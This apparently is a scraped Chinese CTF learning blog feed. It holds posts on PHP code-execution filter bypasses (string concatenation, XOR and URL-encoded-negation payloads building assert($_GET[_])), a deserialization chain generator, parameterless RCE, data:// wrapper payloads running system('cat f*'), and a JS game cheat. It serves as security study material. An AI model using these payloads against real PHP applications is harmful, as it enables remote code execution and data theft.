array_map()返回一个array，数组内容为array1的元素按索引顺序为参数调用callback后的结果（有更多数组时，还会传入arrays的元素）。 callback函数形参的数量必须匹配array_map()实参中数组的数量。</p><p><img src="5.PNG"></p><li>call_user_func()<blockquote><p>call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] ) : mixed</p></blockquote><p><img src="6.PNG"></p><li>call_user_func_array()<p>同array_map()</p><p><img src="7.PNG"></p><li>array_filter用回调函数过滤数组的单元<blockquote><p>array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</p></blockquote><p>依次将array数组中的每个值传递到callback函数。如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><p><img src="8.PNG"><br>注意一下，它第一个参数是数组，第二个参数是callback函数</p><li>usort()<p>使用用户自定义的比较函数对数组中的值进行排序</p><blockquote><p>usort ( array &amp;$array , callable $value_compare_func ) : bool</p></blockquote><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p><p><img src="9.PNG"></p><p>当PHP &gt;= 5.6 &amp; PHP &lt; 7时，php有一个参数变长特性</p><p><img src="10.PNG"></p><h2>字符串拼接绕过</h2><p><img src="11.PNG"></p><p><img src="12.PNG"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>在PHP中不一定需要引号(单引号/双引号)来表示字符串。PHP支持我们声明元素的类型，比如$name = (string)mochu7;，在这种情况下，$name就包含字符串”mochu7”，此外，如果不显示声明类型，那么PHP会将圆括号内的数据当成字符串来处理</p><p><img src="13.PNG"></p><p>这竟然可以不加‘’，!!!</p><h2>字符串转义绕过</h2>>适用php版本：php>=7<p>以八进制表示的[0–7]{1,3}转义字符会自动适配byte（如”\400” == “\000”）</p><p>以十六进制的\x[0–9A-Fa-f]{1,2}转义字符表示法（如“\x41”）</p><p>以Unicode表示的\u{[0–9A-Fa-f]+}字符，会输出为UTF-8字符串</p><p>注意这里转义后的字符必须双引号包裹传参</p><p><img src="14.PNG"></p><p>另外，八进制的方法可以绕过无字母传参进行代码执行</p><h2>多次传参绕过</h2><blockquote><p>适用PHP版本：无限制</p></blockquote><p>如果过滤了引号(单引号/双引号)，可以通过以下方法绕过</p><p><img src="15.PNG"><br><img src="16.PNG"></p><p>post和get两种方式</p><p>如果’.’也被过滤了，可以使用这种方法，就是前面说的（phpin.fo）();这种做法</p><p>另外如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数</p><p><img src="17.PNG"><br><img src="18.PNG"></p><p>回调函数可能大部分看限制的具体长度，但是在PHP &gt;= 5.6 &amp; PHP &lt; 7时对以上过滤方法可以绕过</p><p><img src="19.PNG"></p><h2>内置函数访问绕过</h2><blockquote><p>适用于PHP版本：Windows本地测试的是PHP&gt;=7可以成功，PHP5测试虽然报错但是并不肯定不能使用</p></blockquote><p>测试版本是php 7.4.3</p><p><img src="21.PNG"></p><p><img src="20.PNG"></p><p>不知道为啥后面那个拼接的命令执行不了</p><p><img src="22.png"></p><p>get_definded_functions()[internal][266]();</p><p><img src="23.PNG"></p><p><img src="24.PNG"></p><h2>异或绕过</h2>>适用PHP版本：无限制<p>在PHP中两个字符串异或之后，得到的还是一个字符串。</p><p><img src="25.PNG"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">字符：?         ASCII码：63           二进制：  0011 1111</span><br><span class="line">字符：~         ASCII码：126          二进制：  0111 1110</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR   0   &#x3D;   1</span><br><span class="line">0   XOR   1   &#x3D;   1</span><br><span class="line">0   XOR   0   &#x3D;   0</span><br><span class="line">1   XOR   1   &#x3D;   0</span><br><span class="line">上述两个字符异或得到 二进制：  0100 0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看一到例题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;, $_GET[&#39;shell&#39;]))&#123;</span><br><span class="line">echo &quot;hacker!!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">eval($_GET[&#39;shell&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过滤了所有英文字母和数字，但是我们知道ASCII码中还有很多字母数字之外的字符，利用这些字符进行异或可以得到我们想要的字符</p><blockquote><p>PS：取ASCII表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</p></blockquote><p>异或脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;assert&quot;</span><br><span class="line">strlist &#x3D; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 91, 93, 94, 95, 96, 123, 124, 125, 126, 127]</span><br><span class="line">#strlist是ascii表中所有非字母数字的字符十进制</span><br><span class="line">str1,str2 &#x3D; &#39;&#39;,&#39;&#39;</span><br><span class="line"></span><br><span class="line">for char in payload:</span><br><span class="line">  for i in strlist:</span><br><span class="line">      for j in strlist:</span><br><span class="line">          if(i ^ j &#x3D;&#x3D; ord(char)):</span><br><span class="line">              i &#x3D; &#39;%&#123;:0&gt;2&#125;&#39;.format(hex(i)[2:])</span><br><span class="line">              j &#x3D; &#39;%&#123;:0&gt;2&#125;&#39;.format(hex(j)[2:])</span><br><span class="line">              print(&quot;(&#39;&#123;0&#125;&#39;^&#39;&#123;1&#125;&#39;)&quot;.format(i,j),end&#x3D;&quot;.&quot;)</span><br><span class="line">               break</span><br><span class="line">      else:</span><br><span class="line">          continue</span><br><span class="line">      break</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一次代码执行只能得到我们想要执行语句的字符串，并不能执行语句，所以需要执行两次代码执行，构造</p><blockquote><p>assert($<em>GET[</em>]);</p></blockquote><p>使用脚本对每个字母进行转换，然后拼接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$_&#x3D;(&#39;%01&#39;^&#39;%60&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%05&#39;^&#39;%60&#39;).(&#39;%09&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7c&#39;);</span><br><span class="line">&#x2F;&#x2F;$_&#x3D;&#39;assert&#39;;</span><br><span class="line">$__&#x3D;&#39;_&#39;.(&#39;%07&#39;^&#39;%40&#39;).(&#39;%05&#39;^&#39;%40&#39;).(&#39;%09&#39;^&#39;%5d&#39;);</span><br><span class="line">&#x2F;&#x2F;$__&#x3D;&#39;_GET&#39;;</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">&#x2F;&#x2F;$___&#x3D;&#39;$_GET&#39;;</span><br><span class="line">$_($___[_]);</span><br><span class="line">&#x2F;&#x2F;assert($_GET[_]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>    payload: $_=(&#39;%01&#39;^&#39;%60&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%05&#39;^&#39;%60&#39;).(&#39;%09&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7c&#39;);$__=&#39;_&#39;.(&#39;%07&#39;^&#39;%40&#39;).(&#39;%05&#39;^&#39;%40&#39;).(&#39;%09&#39;^&#39;%5d&#39;);$___=$$__;$_($___[_]);&amp;_=phpinfo();</code></pre><p><img src="26.PNG"></p><p>再放个网上看到的payload</p><p><img src="30.PNG"></p><h2>URL编码取反绕过</h2><p>php -r “var_dump(urlencode(~’phpinfo’));”</p><p><img src="27.PNG"></p><p><img src="28.PNG"></p><p>当5&lt;=PHP&lt;=7.0.9时，需要再执行一次构造出来的字符，所以参考上面那种异或拼接的方法</p><pre><code>    $_=(~&#39;%9E%8C%8C%9A%8D%8B&#39;);$__=&#39;_&#39;.(~&#39;%AF%B0%AC%AB&#39;);$___=$$__;$_($___[_]);    #assert($_GET[_]);</code></pre><p><img src="29.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>实验室反序列化</title>
      <link href="/2021/03/25/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/03/25/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">   public $A1;</span><br><span class="line">   public $A2;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">   public $B1;</span><br><span class="line">   public $B2;</span><br><span class="line">  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">public $C1;</span><br><span class="line">   public $C2;</span><br><span class="line">   public $C3;</span><br><span class="line">&#125;</span><br><span class="line">class D</span><br><span class="line">&#123;</span><br><span class="line">   public $D1&#x3D;&#39;phpinfo();&#39;;</span><br><span class="line">       </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">class E</span><br><span class="line">&#123;</span><br><span class="line">   public $E1;</span><br><span class="line">   public $E2&#x3D;&#39;FLAG&#39;;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a&#x3D;new B();</span><br><span class="line">$a-&gt;B1&#x3D;new A();</span><br><span class="line">$a-&gt;B1-&gt;A2&#x3D;array(&#39;godmi&#39;&#x3D;&gt;new C());</span><br><span class="line">$a-&gt;B1-&gt;A2[&#39;godmi&#39;]-&gt;C3&#x3D;new E();</span><br><span class="line">$a-&gt;B1-&gt;A2[&#39;godmi&#39;]-&gt;C3-&gt;E1&#x3D;new D();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo(urlencode(serialize($a)));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>无参rce总结</title>
      <link href="/2021/03/23/rce%E6%80%BB%E7%BB%93/"/>
      <url>/2021/03/23/rce%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>rce无参数这个东西在很早之前就有接触，但是总是记不住语句，借此对rce无参数进行一个更加具体的理解</p><span id="more"></span><h2>例子1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;</span><br><span class="line">   if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;  </span><br><span class="line">       if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">           if (!preg_match(&#39;&#x2F;na|info|dec|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line"></span><br><span class="line">               @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">           &#125;</span><br><span class="line">           else&#123;</span><br><span class="line">               die(&quot;还差一点哦！&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       else&#123;</span><br><span class="line">           die(&quot;再好好想想！&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   else&#123;</span><br><span class="line">       die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重要代码</p><blockquote><p>/[^\W]+((?R)?)/</p><p>(?R)引用当前表达式，后面加了?递归调用。允许执行类似a(b(c()))格式的无参数函数；</p></blockquote><h3>方法（一）</h3><p>查看当前目录下的所有文件</p><blockquote><?php print_r(scandir("."));?></blockquote><p><img src="1.PNG"></p><p><img src="2.PNG"></p><p>就是之前的不大懂得scandir(“.”)和scandir(“/“),“.”表示的是当前目录上的所有文件，”/“表示的是根目录</p><blockquote><?php print_r(scandir("../"));?></blockquote><p><img src="3.PNG"></p><p>有上我们可以知道可以利用print_r(scandir)去进行查找位置，（scandir() 函数<mark>返回</mark>指定目录中的文件和目录的数组。因为是返回，所以我们可以使用print_r进行输出）</p><p>但是！！！因为存在/[^\W]+((?R)?)/，所以</p><p><a href="https://regex101.com/">正则匹配网址</a></p><p>我们可以看一下</p><p><img src="4.PNG"></p><p><img src="5.PNG"></p><p> if(‘;’ === preg_replace(‘/[^\W]+((?R)?)/‘, ‘’, $_GET[‘exp’]))</p><p>如果我们输入print_r(scandir())的时候，全部被匹配上，然后将其转换为空格，最后只剩下“；”,如果为真成功执行下一步</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow命令执行</title>
      <link href="/2021/03/23/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/03/23/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>学习命令执行</p><span id="more"></span><h2>web 39</h2><p>小tips，看到include要想到伪协议</p><p>先对data协议进行一个复习</p><p><img src="1.PNG"></p><p><img src="2.PNG"></p><p>data://text/plain,&lt;&gt;</p><p>data://text/plain;base64,</p><p><img src="3.PNG"></p><p>看见include,就想到了伪协议，然后我们可以看到flag被过滤了</p><p>如果我们采用最常用的php://filter伪协议</p><p>我们写道php://filter/read=convert.base64-encode/resource=”flag.php”,flag被过滤</p><p>采用data</p><p>data://text/plain,<?php system("cat f*");?><br>data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==(这个无法回显)</p><p>可以看到显示出flag.php的界面</p><p><img src="4.PNG"></p><p>我们可以看到.php,直接显示在html上，因为这个&lt;&gt;,直接在后面形成闭合，所有后面的.php对我们的语句没有影响</p><h2>web 40</h2><p>无参数rce.</p><p><img src="5.PNG"></p><p>?c=print_r(scandir(current(localeconv())));</p><p>?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web174</title>
      <link href="/2021/03/22/ctfshow-web174/"/>
      <url>/2021/03/22/ctfshow-web174/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>打开输入一个数字都显示不出来任何东西，尝试抓包</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020-Easyphp</title>
      <link href="/2021/03/22/GYCTF2020-Easyphp/"/>
      <url>/2021/03/22/GYCTF2020-Easyphp/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>好几天没有更博了，这星期一定要完成任务.<br><br>在想如果我一星期能保证审很长的代码，应该会对我的代码审计能力有帮助吧</p><span id="more"></span><p><img src="1.PNG"></p><p>尝试万能密码，显示的是Damn you, hacker!，进行fuzz模糊测试</p><p><img src="2.PNG"></p><p>显示这些被过滤了</p><p>‘ or updatexml(1,concat(‘`’,database()),1) –+</p><p>emmm,不是sql注入，密码爆破</p><p>登录admin,admin,显示密码错误，所以admin是存在的用户，爆破密码</p><p>报不出来。。。。实在没辙了看了一眼WP，好家伙竟然是<a href="http://www.zip/">www.zip</a>…….</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">update.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once(&#39;lib.php&#39;);</span><br><span class="line">echo &#39;&lt;html&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;update&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;&#x2F;html&gt;&#39;;</span><br><span class="line">if ($_SESSION[&#39;login&#39;]!&#x3D;1)&#123;</span><br><span class="line">echo &quot;你还没有登陆呢！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$users&#x3D;new User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line">if($_SESSION[&#39;login&#39;]&#x3D;&#x3D;&#x3D;1)&#123;</span><br><span class="line">require_once(&quot;flag.php&quot;);</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>update.php那里只是输出你没登录，接下来的代码还会执行。update()方法中会进行反序列化。</p><p><img src="8.PNG"></p><p>简单的理一下POC的思路。本以为是利用User类的__construct方法来读flag.php，但是发现safe()过滤了flag和\，因此会被过滤，无法读取。</p><p>但是UpdateHelper类中也有一个__destruct()方法，会echo。</p><p><img src="9.PNG"></p><p>正好User类存在__toString()方法：</p><p><img src="10.PNG"></p><p>再利用$this-&gt;nickname-&gt;update()去触发Info类的__call()：</p><p><img src="11.PNG"></p><p>这样就可以调用一个login方法。但是怎么得flag？<br>lib.php中有2个login方法，User类得login方法可以让$_SESSION[‘login’]=1，但是必须返回了id：</p><p><img src="12.PNG"></p><p>跟进一下第16行得login方法，看一下逻辑：</p><p><img src="13.PNG"></p><p>想要正常返回$idResult，要么$this-&gt;token==’admin’，要么就是查对了用户名和密码才可以。</p><p>这时候便很自然得可以想到思路了，因为反序列化得时候除了User类中login的这里不可控，其他基本都是可控的。：</p><p><img src="14.PNG"></p><p>也就是说，要分2次。第一次反序列化最终调用的是dbCtrl类的login，因为这里的sql语句和dbCtrl都可控，因此可以成功的$_SESSION[‘token’]=$this-&gt;name;。控一下name，让它是admin。</p><p>#后记</p><p>如果是一个登录口，sql注入，爆破都没有成功的话，可以尝试源码泄露（上次的HCTF又一道题目，也是源码泄露），并且这道题目也有提示说是easyphp。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>laravel5.7-反序列化</title>
      <link href="/2021/03/18/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/03/18/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF-EZ-GAME</title>
      <link href="/2021/03/18/VNCTF-EZ-GAME/"/>
      <url>/2021/03/18/VNCTF-EZ-GAME/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>打开又是一个游戏，咋都这么爱出游戏，上次HCTF的大西瓜，这次的这个又是一头雾水</p><span id="more"></span><p><a href="https://my.oschina.net/u/4386603/blog/4529738">sojson.v4</a></p><p>这是一个前置知识，一个新姿势，我感觉还是暴力破解的方法最直接！！！</p><p>主要是想讲一下，那个js串是怎么得到的</p><p>因为是js混淆嘛，肯定是要从js中找，下面有三个js，就三个都找。</p><p>问题是不知道比赛的时候有没有这个hint，如果没有那么我们是如何在js中那么长的代码中找到这个</p><p>于是</p><p>又是另一种方法</p><p>上次的大西瓜都是在js代码中查找问题，搞懂js代码应该是去通过题目的关键</p><p>先来看看这道题目吧，这个游戏一打开确实我不懂这是怎么玩的</p><p>有一个小提示</p><pre><code>When life gets you down, it&#39;s never too late to...B O U N C E B A C KA JS13k 2019 GameBy Frank ForceWASD = MoveMouse = AimClick = ThrowSpace = DashHints- You will keep money after you die!- You won&#39;t take damage while dashing.- There are 10 levels.- Sand slows down you and enemies.- Yellow boormang can grab pickups.- Blue boomerang does double damage.- Beat the game to unlock speed run mode.</code></pre><p>大概的意思是w a s d是移动，点击鼠标释放工具，空格是短暂的加速</p><p>死后你会存钱！  冲刺时不会受到伤害。  这有十关  沙子减慢了你和敌人的速度（玩了这么长时间，没有见到过沙子，不知道只的是啥）黄色的boormang可以抓取皮卡  蓝色回旋镖造成双倍伤害  击败游戏以解锁速度运行模式。</p><p>那当然就是通关拿到flag，最开始我玩了一次，就感觉跟HCTF那个大西瓜一样，靠自己根本就过不了，也可能是我太菜。</p><p>然后一般游戏，我们都应该去找它的js</p><p><img src="2.PNG"></p><p>有三个js，前两个是engine，应该跟解题没有什么关系</p><p>就看一看game中那个函数有助于我们快速通关，因为以前没有接触过js，所以我看这个感觉很难</p><p>就逐步分析下</p><p>let 语句声明一个块级作用域的本地变量，并且可选的将其初始化为一个值</p><pre><code>    let startLevel=0;    let level;    let levelNumber;    let nextLevel;    let warpLevel=0;    let isFinalLevel;    let isStartLevel;    let levelTimer = new Timer();    let endLevelTimer = new Timer();    let levelExit;    let loadNextLevel;    let levelMaze = [];    let levelMazeSize = 4;    let levelColor = new Color();    let levelFrame;    let boss;    let player;    let playerData;    let playerStartPos;    let winTimer = new Timer();    let healthWarning = new Timer();    let buyTimer = new Timer();    let mainCanvas = c1;    let speedRunMode;    let speedRunTime=0;    let speedRunBestTime=0;    let coinSoundTimer = new Timer();</code></pre><p>·</p><pre><code>    class PlayerData&#123;// track player data between levels (when player is destroyed)constructor()&#123;    this.health = 3;    this.healthMax = 3;    this.boomerangs = 1;    this.bigBoomerangs = 0;    this.coins = 0;&#125;&#125;</code></pre><p>在关卡之间追踪玩家数据（玩家被消灭时），所以如果当玩家死了的时候，就会执行这个类，因为里面有一个生命，生命最大值，回旋镖，大的回旋镖，所以我们可以合理的猜测，如果我们改变了这些值，保存后，当我们玩游戏失败后，就可以在下一盘利用这些值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function NextLevel()</span><br><span class="line">   &#123;</span><br><span class="line">   &#x2F;&#x2F; go to next level</span><br><span class="line">   levelFrame &#x3D; 0;</span><br><span class="line">   levelNumber &#x3D; nextLevel;</span><br><span class="line">   nextLevel &#x3D; (nextLevel+1)%11;</span><br><span class="line">   </span><br><span class="line">   &#x2F;&#x2F; track highest level reached</span><br><span class="line">   if (!speedRunMode &amp;&amp; levelNumber&gt;warpLevel)</span><br><span class="line">       warpLevel &#x3D; levelNumber;</span><br><span class="line">   localStorage.kbap_warp &#x3D; warpLevel;</span><br><span class="line">   </span><br><span class="line">   &#x2F;&#x2F; check if is special level</span><br><span class="line">   isFinalLevel &#x3D; levelNumber&#x3D;&#x3D;10;</span><br><span class="line">   isStartLevel &#x3D; !levelNumber;</span><br><span class="line">   if (isStartLevel)</span><br><span class="line">       speedRunMode &#x3D; 0; &#x2F;&#x2F; reset speed run on start level</span><br><span class="line">   </span><br><span class="line">   InitLevel();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我认为这道题比较仁慈的一点是它会在每个函数（不确定是不是函数），加上这个东西的作用</p><p>如果我们一直在控制台输入NextLevel()，那么我会就会进入下一关，但是在第十关的时候我们必需打败怪物才能得到flag，所以我们可以先去送死一次，刚才的修改我们可以得到很大的属性值，然后可以打败怪物</p><p>然后我感觉下面我们可以去找一下winTimer，因为在let里面有哪个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (isFinalLevel)</span><br><span class="line">          &#123;</span><br><span class="line">              &#x2F;&#x2F; player win</span><br><span class="line">              new Pickup(this.pos, 2);</span><br><span class="line">              SpawnPickups(this.pos,1,40);</span><br><span class="line">              winTimer.Set();</span><br><span class="line">              localStorage.kbap_warp&#x3D;0;</span><br><span class="line">              localStorage.kbap_won&#x3D;1;</span><br><span class="line">              speedRunTime&#x3D;speedRunTime|0;</span><br><span class="line">              if (speedRunMode &amp;&amp; (!speedRunBestTime || speedRunTime &lt; speedRunBestTime))</span><br><span class="line">              &#123;</span><br><span class="line">                  &#x2F;&#x2F; track best speed run time</span><br><span class="line">                  speedRunBestTime &#x3D; speedRunTime;</span><br><span class="line">                  localStorage.kbap_bestTime&#x3D;speedRunBestTime;</span><br><span class="line">              &#125;</span><br><span 